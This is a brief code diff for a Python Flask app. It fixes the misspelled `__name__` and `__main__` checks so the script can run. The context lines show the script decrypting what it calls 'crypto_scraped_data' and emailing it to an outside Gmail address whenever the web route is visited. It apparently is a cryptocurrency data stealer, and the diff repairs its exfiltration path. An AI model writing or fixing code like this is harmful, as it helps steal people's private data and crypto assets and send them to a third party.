@@ -111,7 +111,7 @@ def main():
     decrypted_data = decrypt_data(encrypted_data)
     send_email("crypto_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)
 
-app = Flask(_name_)
+app = Flask(__name__)
 
 @app.route('/')
 def run_script():
@@ -119,5 +119,5 @@ def run_script():
     main()
     return "Script executed successfully"
 
-if _name_ == '_main_':
+if __name__ == '__main__':
     app.run()
